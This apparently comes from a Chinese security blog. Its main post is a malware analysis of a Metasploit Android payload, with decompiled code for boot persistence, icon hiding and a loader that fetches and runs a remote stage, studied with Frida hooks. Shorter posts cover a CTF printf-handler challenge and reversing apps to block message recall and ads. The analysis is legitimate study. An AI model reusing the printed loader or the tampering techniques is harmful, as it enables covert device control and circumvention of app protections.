            &lt;data android:host=&quot;my_host&quot; android:scheme=&quot;metasploit&quot;/&gt;
            &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt;
            &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt;
            &lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt;
        &lt;/intent-filter&gt;
    &lt;/activity&gt;
    &lt;receiver android:label=&quot;MainBroadcastReceiver&quot; android:name=&quot;.MainBroadcastReceiver&quot;&gt;
        &lt;intent-filter&gt;
            &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;/&gt;
        &lt;/intent-filter&gt;
    &lt;/receiver&gt;
    &lt;service android:exported=&quot;true&quot; android:name=&quot;.MainService&quot;/&gt;
&lt;/application&gt;
</code></pre>
<p>活动类名：<code>MainActivity</code></p>
<p>注册intent：</p>
<ul>
<li><code>&lt;action android:name=&quot;android.intent.action.MAIN&quot;/&gt;</code> - 指定该活动为应用程序的主要入口点。</li>
<li><code>&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;/&gt;</code> - 指定该活动为启动器活动，即显示在设备的应用程序列表中并且可由用户启动</li>
<li>指定了<code>metasploit</code>协议链接的主机和方案</li>
<li>等等</li>
</ul>
<h5 id="MainService"><a href="#MainService" class="headerlink" title="MainService"></a>MainService</h5><pre><code class="java">public static void start() &#123;
    Class v0_2;
    try &#123;
        v0_2 = Class.forName(&quot;android.app.ActivityThread&quot;);
        goto label_5;
    &#125;
    catch(ClassNotFoundException v0_1) &#123;
        return;
        try &#123;
        label_5:
            Method v1 = v0_2.getMethod(&quot;currentApplication&quot;);
            Context v0_3 = (Context)v1.invoke(null, null);
            if(v0_3 == null) &#123;
                new Handler(Looper.getMainLooper()).post(new c(v1));
                return;
            &#125;
            MainService.startService(v0_3);
        &#125;
        catch(Exception v0) &#123;
        &#125;
        return;
    &#125;
    catch(Exception v0) &#123;
        return;
    &#125;
&#125;
</code></pre>
<ul>
<li>尝试通过反射加载<code>android.app.ActivityThread</code>中的<code>currentApplication</code>方法并通过<code>invoke</code>执行，转化为context类型保存，如果获取不到Context，则通过主线程的 <code>Handler</code> 将一个新的 <code>Runnable</code> 对象发送到消息队列中，以便在主线程中执行，c中的逻辑为在运行时尝试通过之前传递进来的 <code>Method</code> 对象获取 <code>Context</code> 对象，并在获取成功时启动 <code>MainService</code> 服务</li>
</ul>
<pre><code class="java">final class c implements Runnable &#123;
    private Method a;

    c(Method arg1) &#123;
        this.a = arg1;
        super();
    &#125;

    @Override
    public final void run() &#123;
        try &#123;
            Context v0_1 = (Context)this.a.invoke(null, null);
            if(v0_1 != null) &#123;
                MainService.startService(v0_1);
                return;
            &#125;
        &#125;
        catch(Exception v0) &#123;
            return;
        &#125;
    &#125;
&#125;
</code></pre>
<blockquote>
<p>java 反射：<a href="https://developer.aliyun.com/article/812647">深入理解Java中的反射机制及使用原理！详细解析invoke方法的执行和使用-阿里云开发者社区 (aliyun.com)</a></p>
<ul>
<li>允许运行中的Java程序获取自身信息,并可以操作类或者对象的内部属性</li>
<li>程序中的对象一般都是在编译时就确定下来,Java反射机制可以动态地创建对象并且调用相关属性,这些对象的类型在编译时是未知的</li>
<li>也就是说 ，可以通过反射机制<strong>直接创建对象,即使这个对象类型在编译时是未知的</strong></li>
</ul>
<p>类的加载机制：<strong>JVM</strong>使用<strong>ClassLoader</strong>将字节码文件,即 <strong>class</strong>文件加载到方法区内存中</p>
<pre><code class="java">Class clazz = ClassLoader.getSystemClassLoader().loadClass(&quot;com.mypackage.MyClass&quot;);
</code></pre>
<p><strong>ClassLoader</strong>类根据类的完全限定名加载类并返回一个<strong>Class</strong>对象</p>
<p>反射的用途：</p>
<ul>
<li>很多框架都是配置化的,通过<strong>XML</strong>文件配置<strong>Bean</strong></li>
<li>为了保证框架的通用性,需要根据配置文件加载不同的对象或者类,调用不同的方法</li>
<li>要运用反射,运行时动态加载需要加载的对象</li>
</ul>
<p><strong>这里主要就是用③，实现动态加载，反射是各种容器实现的核心</strong></p>
<p>从类中获取一个方法后,可以使用<strong>invoke()</strong> 来调用这个方法</p>
</blockquote>
<pre><code class="java">public int onStartCommand(Intent arg2, int arg3, int arg4) &#123;
    Payload.start(this);
    return 1;
&#125;
</code></pre>
<p><code>Service</code> 类的重写方法，用于处理启动服务的命令。<code>1</code> 表示如果服务被杀死了，系统尝试重新创建服务并调用 <code>onStartCommand()</code> 方法；即这里会维持在后台循环启动payload</p>
<p>我们知道，frida会悬挂进程并多起四个线程（可以自行调试，这个地方还没有具体了解原理，不过需要注意）那么我们编辑运行基本的一个脚本就会观察到有</p>
<pre><code class="javascript">setImmediate(function()&#123;
    console.log(&quot;lld [*]&quot;);
    Java.perform(function()&#123;
        var myClass = Java.use(&quot;com.metasploit.stage.MainActivity&quot;);
        myClass.implementation = function(v)&#123;
        &#125;
    &#125;)
&#125;)
</code></pre>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424133646117.png" alt="image-20240424133646117"></p>
<p>后台重新加载了几次payload，使得vps重新接收到了sessions，随即关闭掉前面的链接，可以认为我们的推断是基本正确的，这部分实现了马的持久化</p>
<p>测试payload的重加载：</p>
<pre><code class="javascript">setImmediate(function()&#123;
    console.log(&quot;lld [*]&quot;);
    Java.perform(function()&#123;
        var myClass = Java.use(&quot;com.metasploit.stage.MainService&quot;);
        myClass.onStartCommand.implementation = function(arg2, arg3, arg4)&#123;
            send(&#39;com.myclass.onStartCommand.implementation&#39;);
            var ret = this.onStartCommand(arg2, arg3, arg4);
            send(&quot;result:&quot;+2);
            return 2;
        &#125;
    &#125;)
&#125;)
</code></pre>
<img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424142410325.png" alt="image-20240424142410325" style="zoom:33%;">

<p>修改返回值，服务会快速重置，但是新的连接无法维持，原因是我们hook了返回值为<code>START_NOT_STICKY</code></p>
<h5 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h5><h6 id="class-b"><a href="#class-b" class="headerlink" title="class b"></a>class b</h6><pre><code class="java">private static int a(byte[] arg4, int arg5) &#123;
    int v0 = 0;
    int v1 = 0;
    while(v0 &lt; 4) &#123;
        v1 |= (arg4[v0 + arg5] &amp; 0xFF) &lt;&lt; (v0 &lt;&lt; 3);
        ++v0;
    &#125;

    return v1;
&#125;
</code></pre>
<p>这里明显是一个大小端序转化，基本上就是在对payload做数据处理，先大体手动还原符号，看起来就是简单编码还原payload内容并获取信息：</p>
<pre><code class="java">package com.metasploit.stage;

import java.io.UnsupportedEncodingException;
import java.util.concurrent.TimeUnit;

public final class b &#123;
    private static final long timestamp;

    static &#123;
        b.timestamp = TimeUnit.SECONDS.toMillis(1L);
    &#125;

    private static int change_endian(byte[] arg4, int arg5) &#123;
        int v0 = 0;
        int v1 = 0;
        while(v0 &lt; 4) &#123;
            v1 |= (arg4[v0 + arg5] &amp; 0xFF) &lt;&lt; (v0 &lt;&lt; 3);
            ++v0;
        &#125;

        return v1;
    &#125;

    public static a a(byte[] arg11) &#123;
        a v3 = new a();
        v3.a = b.change_endian(arg11, 0);
        long v6 = (long)b.change_endian(arg11, 12);
        v3.b = b.timestamp * v6;
        b.copy_array(arg11, 16, 16);
        b.copy_array(arg11, 0x20, 16);
        int v0 = 0x30;
        if((v3.a &amp; 1) != 0) &#123;
            v3.c = b.encode(arg11, 8000, 100);
        &#125;

        while(arg11[v0] != 0) &#123;
            g v4 = new g();
            v4.a = b.encode(arg11, v0, 0x200);
            int v0_1 = v0 + 0x204;
            long v8 = (long)b.change_endian(arg11, v0_1);
            v4.b = b.timestamp * v8;
            int v0_2 = v0_1 + 4;
            long v8_1 = (long)b.change_endian(arg11, v0_2);
            v4.c = b.timestamp * v8_1;
            v0 = v0_2 + 4;
            if(v4.a.startsWith(&quot;http&quot;)) &#123;
                b.encode(arg11, v0, 0x80);
                int v0_3 = v0 + 0x80;
                b.encode(arg11, v0_3, 0x40);
                int v0_4 = v0_3 + 0x40;
                b.encode(arg11, v0_4, 0x40);
                int v0_5 = v0_4 + 0x40;
                v4.d = b.encode(arg11, v0_5, 0x100);
                int v0_6 = v0_5 + 0x100;
                v4.e = null;
                byte[] v5 = b.copy_array(arg11, v0_6, 20);
                int v2 = v0_6 + 20;
                int v0_7;
                for(v0_7 = 0; v0_7 &lt; v5.length; ++v0_7) &#123;
                    if(v5[v0_7] != 0) &#123;
                        v4.e = v5;
                        break;
                    &#125;
                &#125;

                StringBuilder v5_1 = new StringBuilder();
                int v0_8;
                for(v0_8 = v2; v0_8 &lt; arg11.length; ++v0_8) &#123;
                    byte v7 = arg11[v0_8];
                    if(v7 == 0) &#123;
                        break;
                    &#125;

                    v5_1.append(((char)(v7 &amp; 0xFF)));
                &#125;

                String v0_9 = v5_1.toString();
                v4.f = v0_9;
                v0 = v0_9.length() + v2;
            &#125;

            v3.d.add(v4);
        &#125;

        return v3;
    &#125;

    private static String encode(byte[] arg3, int arg4, int arg5) &#123;
        byte[] v0 = b.copy_array(arg3, arg4, arg5);
        try &#123;
            return new String(v0, &quot;ISO-8859-1&quot;).trim();
        &#125;
        catch(UnsupportedEncodingException v1) &#123;
            return new String(v0).trim();
        &#125;
    &#125;

    private static byte[] copy_array(byte[] arg2, int arg3, int arg4) &#123;
        byte[] v0 = new byte[arg4];
        System.arraycopy(arg2, arg3, v0, 0, arg4);
        return v0;
    &#125;
&#125;
</code></pre>
<p>这里重载函数比较多，可以直接拿脚本批量打印一下看，</p>
<pre><code class="javascript">function logInf(classs)&#123;
    Java.perform(function ()&#123;
        var Modifier = Java.use(&quot;com.metasploit.stage.b&quot;);
        var modifiers = classs.getModifiers();
        classs.setAccessible(true);
        if (Modifier.isStatic(modifiers)) &#123;
            // 静态字段
            var value = classs.get(null);
            console.log(classs + &quot; =&gt;&quot;  + value)
        &#125; else &#123;
             console.log(classs)
        &#125;
    &#125;)
&#125;
function getAllsonClass(classs)&#123;
    console.log(&#39;\n&#39;)
    console.log(&quot;查询到子类  =&gt;&quot; + classs.getName())
    hookClass(String(classs.getName()))
&#125;
var thisclass = null;
//&quot;java.security.MessageDigest&quot;
function hookClass(CLASS)&#123;
Java.perform(function()&#123;
    var classStudent = Java.use(CLASS);
    var classs = classStudent.class;
 
    //获取所有内部类
    var innerClasses = classs.getDeclaredClasses();
    if(innerClasses.length &gt; 0)&#123;
        innerClasses.forEach(getAllsonClass);
    &#125;
    console.log(&quot;===========&quot; + classs + &quot;中的所有变量==============&quot;)
    //输出所有变量
    classs.getDeclaredFields().forEach(logInf)
    console.log(&quot;===========&quot; + classs +  &quot;的所有方法==============&quot;)
    //输出所有方法,并hook
    classs.getDeclaredMethods().forEach(function(method)&#123;
        console.log(method)
       var methodsName = method.getName();
       var overloads  = classStudent[methodsName].overloads;
    //    console.log(overloads.length)
       for (var i=0; i&lt; overloads.length; i++)&#123;
            overloads[i].implementation = function () &#123;
            console.log(&#39;\n&#39;)
            console.warn(&quot;进入&quot; + classs.getName() + &quot;类的&quot; + methodsName + &quot;方法&quot;)
            for(var j=0; j&lt;arguments.length; j++)&#123;
                console.error(&quot;参数&quot; + j + &quot; =&gt; &quot; + arguments[j])
            &#125;
            if (arguments.length === 0) &#123;
              console.log(&quot;该函数无参数&quot;);
            &#125;
            var result = this[methodsName].apply(this,arguments)
            console.error(&quot;结果是 =&gt; &quot; + result)
            return result;
            &#125;;
        &#125;
    &#125;)
    console.log(&#39;\n&#39;)
&#125;)
&#125;
function main()&#123;
    try &#123;
        hookClass(&quot;com.metasploit.stage.b&quot;)
    &#125;catch (e) &#123;
        console.log(&quot;没有找到该类&quot;)
    &#125;
&#125;
 
setImmediate(main)
</code></pre>
<p>可以看到两个比较关键的结果：</p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424154214031.png" alt="image-20240424154214031"></p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424154229414.png" alt="image-20240424154229414"></p>
<p>即，这里的payload就是msf马生成的信息部分，在b函数中还原出信息并添加生成一个http request包</p>
<h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><pre><code class="java">if((v6.a &amp; 4) != 0 &amp;&amp; Payload.b != null) &#123;
    PowerManager.WakeLock v0 = ((PowerManager)Payload.b.getSystemService(&quot;power&quot;)).newWakeLock(1, Payload.class.getSimpleName());
    v0.acquire();
    v1 = v0;
&#125;
</code></pre>
<ul>
<li>这里创建了一个 <code>WakeLock</code> 对象 <code>v0</code>，它允许应用程序保持设备唤醒状态，这里通过 <code>Payload.b.getSystemService(&quot;power&quot;)</code> 获取了系统服务 <code>power</code>，并将其转换为 <code>PowerManager</code> 对象。然后调用 <code>newWakeLock(1, Payload.class.getSimpleName())</code> 方法创建了一个 <code>WakeLock</code> 对象，参数 <code>1</code> 表示创建的 <code>WakeLock</code> 类型是 <code>PARTIAL_WAKE_LOCK</code>，即部分唤醒锁定，它允许CPU继续运行，但允许屏幕和其他系统资源关闭。</li>
</ul>
<pre><code class="java">private static void a() &#123;
    if(Payload.b != null) &#123;
        String v1 = Payload.b.getPackageName();
        PackageManager v2 = Payload.b.getPackageManager();
        Intent v0 = new Intent(&quot;android.intent.action.MAIN&quot;, null);
        v0.addCategory(&quot;android.intent.category.LAUNCHER&quot;);
        for(Object v0_1: v2.queryIntentActivities(v0, 0)) &#123;
            ResolveInfo v0_2 = (ResolveInfo)v0_1;
            if(!v1.equals(v0_2.activityInfo.packageName)) &#123;
                continue;
            &#125;
            v2.setComponentEnabledSetting(new ComponentName(v1, v0_2.activityInfo.name), 2, 1);
        &#125;
    &#125;
&#125;
</code></pre>
<ul>
<li>实现了禁用启动器图标，与上文callback可以隐匿在后台刷新</li>
</ul>
<p>下面一段是进行基础的tcp解包，不需要讲，后面可以直接抓包看行为</p>
<pre><code class="java">private static void a(DataInputStream arg11, OutputStream arg12, Object[] arg13) &#123;
    if(Payload.e == null) &#123;
        String v0 = (String)arg13[0];
        String v1 = v0 + File.separatorChar + Integer.toString(new Random().nextInt(0x7FFFFFFF), 36);
        String v2 = v1 + &quot;.jar&quot;;
        String v3 = new String(Payload.a(arg11));
        byte[] v4 = Payload.a(arg11);
        File v5 = new File(v2);
        if(!v5.exists()) &#123;
            v5.createNewFile();
        &#125;

        FileOutputStream v6 = new FileOutputStream(v5);
        v6.write(v4);
        v6.flush();
        v6.close();
        Class v0_1 = new DexClassLoader(v2, v0, v0, Payload.class.getClassLoader()).loadClass(v3);
        Object v2_1 = v0_1.newInstance();
        v5.delete();
        new File(v1 + &quot;.dex&quot;).delete();
        v0_1.getMethod(&quot;start&quot;, DataInputStream.class, OutputStream.class, Object[].class).invoke(v2_1, arg11, arg12, arg13);
    &#125;
    else &#123;
        Payload.class.getClassLoader().loadClass(Payload.e).getConstructor(DataInputStream.class, OutputStream.class, Object[].class, Boolean.TYPE).newInstance(arg11, arg12, arg13, Boolean.valueOf(false));
    &#125;

    Payload.c = -1L;
&#125;
</code></pre>
<p>这里很明显动态生成了文件，并反射运行其中的部分内容，相同的方法抓取方法返回值和参数，可以拿到：</p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424161446827.png" alt="image-20240424161446827"></p>
<p>反射运行了这个方法，这里仍旧是一个loader</p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424160834420.png" alt="image-20240424160834420"></p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424160846551.png" alt="image-20240424160846551"></p>
<p>那么这里就需要获得里面的<code>met.jar</code>，有点缺乏经验不知道怎么搞（这里需要清楚，frida去hook的是app内所有的内容，即使loader加载的也不例外），不过询问了一下可以去hook <code>File.delete</code>，然后去找文件</p>
<pre><code class="javascript">setImmediate(function()&#123;
    console.log(&quot;lld [*]&quot;);
    Java.perform(function()&#123;
        var myClass = Java.use(&quot;java.io.File&quot;);
        myClass.delete.implementation = function()&#123;
            // var ret = this.onStartCommand();
            console.log(&quot;delete hooked&quot;);
        &#125;
    &#125;)
&#125;)
</code></pre>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424190256641.png" alt="image-20240424190256641"></p>
<p>这frida确实有点好用的</p>
<h5 id="met-jar"><a href="#met-jar" class="headerlink" title="met.jar"></a>met.jar</h5><p>根据刚才的分析，入口类就是这里的<code>com.metasploit.meterpreter.AndroidMeterpreter</code></p>
<p><img src="/2024/03/28/msf-Android%E9%A9%AC%E5%88%86%E6%9E%90/image-20240424191136119.png" alt="image-20240424191136119"></p>
<p>里面的马已经相当明文，就暂时不看了</p>
]]></content>
  </entry>
  <entry>
    <title>pickle反序列化</title>
    <url>/2023/09/18/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    <content><![CDATA[<h6 id="PREFACE-就是看看"><a href="#PREFACE-就是看看" class="headerlink" title="PREFACE: 就是看看~"></a>PREFACE: 就是看看~</h6><span id="more"></span>

<p><a href="https://zhuanlan.zhihu.com/p/89132768">从零开始python反序列化攻击：pickle原理解析 &amp; 不用reduce的RCE姿势 - 知乎 (zhihu.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>print占位符重写初探</title>
    <url>/2023/09/27/print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="PREFACE-BRICS题目都太高手了，只有这个shellcode是也许能做的，可惜没有ios设备，动调不了的话并没有把握出这个题"><a href="#PREFACE-BRICS题目都太高手了，只有这个shellcode是也许能做的，可惜没有ios设备，动调不了的话并没有把握出这个题" class="headerlink" title="PREFACE: BRICS题目都太高手了，只有这个shellcode是也许能做的，可惜没有ios设备，动调不了的话并没有把握出这个题"></a>PREFACE: BRICS题目都太高手了，只有这个shellcode是也许能做的，可惜没有ios设备，动调不了的话并没有把握出这个题</h6><span id="more"></span>

<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>main里面只有这个，如果不调会以为它真的输出一个环境作为版本号？</p>
<p><img src="/2023/09/27/print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927081520710.png" alt="image-20230927081520710"></p>
<p>实际上，其他全在init_array里面</p>
<p><img src="/2023/09/27/print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927081242134.png" alt="image-20230927081242134"></p>
<p>随便搜搜可以找到这个：</p>
<p><img src="/2023/09/27/print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927081346303.png" alt="image-20230927081346303"></p>
<p>也就是说，main里面会触发这个：</p>
<p><img src="/2023/09/27/print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927081803593.png" alt="image-20230927081803593"></p>
<p><img src="/2023/09/27/print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927081816418.png" alt="image-20230927081816418"></p>
<p>至此，信息就比较清晰了：</p>
<p>main调用<code>f</code>占位符重写的函数，在这里会先<code>scanf</code>一个任意字符串，和一个操作数</p>
<p>接着触发print，可以在上面的任意字符串中构造占位符，将需要的flag读入，具体的读入需求可以找到；</p>
<p><img src="/2023/09/27/print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927082133233.png" alt="image-20230927082133233"></p>
<p>这个check函数，并且它的占位符是R：</p>
<p><img src="/2023/09/27/print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927082216693.png" alt="image-20230927082216693"></p>
<p>也就是每轮的这个位置会check一次</p>
<p>即我们需要调用一个占位符重写函数把flag先写到bss段里面，翻找以后只有这个，对于的占位符是<code>p</code></p>
<p><img src="/2023/09/27/print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927082259489.png" alt="image-20230927082259489"></p>
<p><img src="/2023/09/27/print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927082322860.png" alt="image-20230927082322860"></p>
<p>那么可以猜测，我们需要对应flag的位数传入<code>%p</code>，再输入flag存到它的模拟栈上</p>
<p>根据这些占位符，可以大概找一下流程：</p>
<p><img src="/2023/09/27/print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927082606541.png" alt="image-20230927082606541"></p>
<p>即：</p>
<p><img src="/2023/09/27/print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927082617079.png" alt="image-20230927082617079"></p>
<p>大概逻辑是：</p>
<pre><code class="python">x ** 2 - y ** 3 - num1 = num2
</code></pre>
<p>然后爆破求解就行</p>
<p>本来或许以为到这里就快出了？</p>
<p>那么为啥讨厌ios呢，调不起来，然后仔细一看发现</p>
<p><img src="/2023/09/27/print%E5%8D%A0%E4%BD%8D%E7%AC%A6%E9%87%8D%E5%86%99%E5%88%9D%E6%8E%A2/image-20230927082853386.png" alt="image-20230927082853386"></p>
<p>这里十个占位符只有三个注册的有参函数却传入了七个值……</p>
<p>那既然不能动调去直接看，那先自己写个程序测测呗，反正结束了慢慢学</p>
<pre><code class="cpp">#include &lt;stdio.h&gt;
#include &lt;printf.h&gt;
#include &lt;string.h&gt;

int dollar_handler(FILE *stream, const struct printf_info *info, const void *const *args) &#123;
    char buffer[256];
    int len;

    int value = *(const int *)(args[0]);

    len = snprintf(buffer, sizeof(buffer), &quot;$%d&quot;, value);

    return fprintf(stream, &quot;here is %s&quot;, buffer);
&#125;

static int arginfo_1(const struct printf_info *info, size_t n, int *argtypes) &#123;
    if (n &gt; 0) &#123;
        argtypes[0] = PA_INT;
    &#125;
    return 1;
&#125;

printf(&quot;%$\n&quot;, 12345, 12346);

# here is $12345
</code></pre>
<p>看起来后面几个参数理论上用不到，但是感觉很不合理，遂不想做了</p>
<p>不过这个玩意在藏东西上其实有点意思，可以来出个小题玩一下，刚好又差不多准备搞个出虚拟机的玩，那就试试</p>
<h6 id="9-29-不对，想了想应该还是ida抽风，估计看看汇编调用的话这些参数问题不大"><a href="#9-29-不对，想了想应该还是ida抽风，估计看看汇编调用的话这些参数问题不大" class="headerlink" title="9-29: 不对，想了想应该还是ida抽风，估计看看汇编调用的话这些参数问题不大"></a>9-29: 不对，想了想应该还是ida抽风，估计看看汇编调用的话这些参数问题不大</h6><h6 id="不过出题已经放在list上了，先把题出了看看，再看有没有时间把这个题给做了，最近确实会比较忙"><a href="#不过出题已经放在list上了，先把题出了看看，再看有没有时间把这个题给做了，最近确实会比较忙" class="headerlink" title="不过出题已经放在list上了，先把题出了看看，再看有没有时间把这个题给做了，最近确实会比较忙"></a>不过出题已经放在list上了，先把题出了看看，再看有没有时间把这个题给做了，最近确实会比较忙</h6>]]></content>
  </entry>
  <entry>
    <title>hook某聊天软件lab</title>
    <url>/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/</url>
    <content><![CDATA[<h6 id="起因是在学安卓逆向，而且自己水平太低，打算练练手。恰巧某友的校内lab做了类似的东西，羡慕，遂打算动手尝试复现"><a href="#起因是在学安卓逆向，而且自己水平太低，打算练练手。恰巧某友的校内lab做了类似的东西，羡慕，遂打算动手尝试复现" class="headerlink" title="起因是在学安卓逆向，而且自己水平太低，打算练练手。恰巧某友的校内lab做了类似的东西，羡慕，遂打算动手尝试复现"></a>起因是在学安卓逆向，而且自己水平太低，打算练练手。恰巧某友的校内lab做了类似的东西，羡慕，遂打算动手尝试复现</h6><span id="more"></span>

<h4 id="一、某绿色软件防撤回"><a href="#一、某绿色软件防撤回" class="headerlink" title="一、某绿色软件防撤回"></a>一、某绿色软件防撤回</h4><p>首先搜索相关字串<code>revoke</code>，找到一个<code>RevokeMsgEvent</code>，看起来很像，然后翻找代码，发现了这个listener用于接收一个撤回消息事件</p>
<h5 id><a href="#" class="headerlink" title></a><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230809174202432.png" alt="image-20230809174202432"></h5><p>观察这里的callback函数，先赋值到一个叫做<code>revokeMsgEvent2</code>的class上（什么鬼命名…但是看起来可能挺重要的，marked一下）</p>
<p>接着合法性检测，不需要管</p>
<p>p0.D的声明如下</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230809175148467.png" alt="image-20230809175148467"></p>
<p>猜测这里是通知一栏，将原通知的属性修改为已撤回的属性，两者参数string声明如下：</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230809175818647.png" alt="image-20230809175818647"></p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230809175830933.png" alt="image-20230809175830933"></p>
<p>不好懂，接着往下看</p>
<p>可以明确的是这里的class h是和撤回相关操作的类，结合下面的调用，猜测这里就是集中处理撤回用的函数（对本地数据库进行了一些操作与删除），查看一下其声明，均是revoke的相关操作，那合理来说不会影响正常的流程，直接hook就行。</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230809185208738.png" alt="image-20230809185208738"></p>
<p>这里试一下<code>frida</code>脚本hook的操作。</p>
<p>首先是这里只有arm的包，暂时没有物理机做测试，可以用的方案有三个：AS、qemu、商业模拟器</p>
<table>
<thead>
<tr>
<th>AS</th>
<th>qemu</th>
<th>商业模拟器</th>
</tr>
</thead>
<tbody><tr>
<td>开发必备</td>
<td>比较折腾，但是稍微比AS效率好一点</td>
<td>运行比较流畅，但是版本选择有限，而且还有很多版本和hyperV犯冲，选择更加有限</td>
</tr>
</tbody></table>
<p>这里选择先用AS尝试了一下，配置如下（一点点尝试可以运行起来的arm架构）：<img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810132624458.png" alt="image-20230810132624458"></p>
<p>巨慢无比，还不支持android studio的一些便携操作，结果和绿色软件的so还不兼容…麻了…</p>
<p>尝试使用mumuX（亲测只有mumux在本机可以和WSL2共存，其他声称支持hyperV的都会出问题，待修复），会被检测环境，来尝试配一下qemu</p>
<p>疑似不太行，毕竟AS也是基于qemu的，该卡照样卡（据说mac上用as模拟android非常流畅……）</p>
<p>然后发现微软自家的vs有安卓模拟器，那来尝试一下下</p>
<h6 id="to-be-continue"><a href="#to-be-continue" class="headerlink" title="- to be continue"></a>- to be continue</h6><h4 id="二、某运动软件广告消除以及强制更新破解"><a href="#二、某运动软件广告消除以及强制更新破解" class="headerlink" title="二、某运动软件广告消除以及强制更新破解"></a>二、某运动软件广告消除以及强制更新破解</h4><h6 id="之前队里一直有跌说加了壳搞不了，但是感觉好像么有点机会，遂来看看，这里是用的一个旧版本，好像对root的检测没那么严格，但是也能用，后面有空再调一个新版本的"><a href="#之前队里一直有跌说加了壳搞不了，但是感觉好像么有点机会，遂来看看，这里是用的一个旧版本，好像对root的检测没那么严格，但是也能用，后面有空再调一个新版本的" class="headerlink" title="之前队里一直有跌说加了壳搞不了，但是感觉好像么有点机会，遂来看看，这里是用的一个旧版本，好像对root的检测没那么严格，但是也能用，后面有空再调一个新版本的"></a><del>之前队里一直有跌说加了壳搞不了，但是感觉好像么有点机会，遂来看看，这里是用的一个旧版本，好像对root的检测没那么严格，但是也能用，后面有空再调一个新版本的</del></h6><p>通过搜索引擎可以找到一个文档，<a href="https://www.csjplatform.com/supportcenter/5398">开屏广告-Android集成文档-开发测试-穿山甲广告平台 (csjplatform.com)</a>，这个app的部分广告大概就是基于这个开发的</p>
<p>大概定位到这个类上，是广告加载用的类</p>
<h5 id="-1"><a href="#-1" class="headerlink" title></a><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810164814274.png" alt="image-20230810164814274"></h5><p>合理来说把这里hook一下</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810165617746.png" alt="image-20230810165617746"></p>
<p>就能消掉大部分和ad相关的事件了</p>
<p>但是接着看下去就感觉事情不对头了，这里的<code>com.fighter.wrapper</code>疑似只是一个ad的处理方法，仔细看左边的包还有一万个不同公司的ad……破软件没啥功能，集成的广告不少</p>
<p><img src="/2023/08/09/hook%E6%9F%90%E8%81%8A%E5%A4%A9%E8%BD%AF%E4%BB%B6lab/image-20230810171514620.png" alt="image-20230810171514620"></p>
<p>而且后面很多广告用的不是这个方法，那就是不能在这层hook了，会累死自己，最好的解决方法还是在调用这n个广告类前就掐掉源头</p>
<p>可以搜索发现<code>com.zjwh</code>应该是这软件自己的包，命名做的手动混淆，全都是oO0啥的…</p>
<p>这里发现了反虚拟环境和反hook的操作，那看来后面有点点不好整的</p>
